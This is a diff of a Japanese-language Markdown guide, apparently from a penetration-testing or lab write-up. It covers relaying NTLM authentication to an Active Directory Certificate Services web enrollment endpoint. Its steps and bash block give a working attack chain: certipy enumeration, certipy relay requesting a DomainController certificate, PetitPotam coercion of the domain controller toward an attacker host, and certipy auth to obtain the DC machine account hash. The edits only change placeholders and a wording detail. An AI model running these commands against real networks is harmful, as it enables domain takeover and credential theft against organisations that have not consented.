@@ -24,7 +24,7 @@ Unconstrained Delegation の悪用と同様、「DC に何らかの形で認証�
 
 1. CA の HTTP 登録エンドポイントが有効かつ NTLM 認証を受け付けているか確認する。
 2. NTLM リレーツールを、そのエンドポイントへ中継するよう設定して起動する。
-3. 強制認証手法（プリンタスプーラの強制認証バグなど）で、DC を攻撃者のリレーサーバーへ認証させる。
+3. 強制認証手法（PetitPotam の EFSRPC やプリンタスプーラなど）で、DC を攻撃者のリレーサーバーへ認証させる。
 4. リレーされたセッションで DC 名義の証明書を取得する。
 5. 取得した証明書で PKINIT 認証し、DC としてのチケットを得る。
 
@@ -32,16 +32,16 @@ Unconstrained Delegation の悪用と同様、「DC に何らかの形で認証�
 
 ```bash
 # Web 登録（/certsrv）が有効な CA を探す
-certipy find -u <user>@lab.local -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout
+certipy find -u user@lab.local -p 'Password123' -dc-ip <DC_IP> -vulnerable -stdout
 
 # CA の Web 登録エンドポイントへ NTLM をリレーして証明書を要求する
-certipy relay -target 'http://<ca-host>/certsrv/certfnsh.asp' -template DomainController
+certipy relay -target 'http://<CA_HOST>/certsrv/certfnsh.asp' -template DomainController
 
 # 別の端末から DC に認証を強制する
-python3 PetitPotam.py <attacker-ip> <dc-ip>
+python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
 
 # 取得した証明書で認証し、DC のマシンアカウントのハッシュを得る
-certipy auth -pfx <dc>.pfx -dc-ip <dc-ip>
+certipy auth -pfx dc.pfx -dc-ip <DC_IP>
 ```
 
 ## 注意点
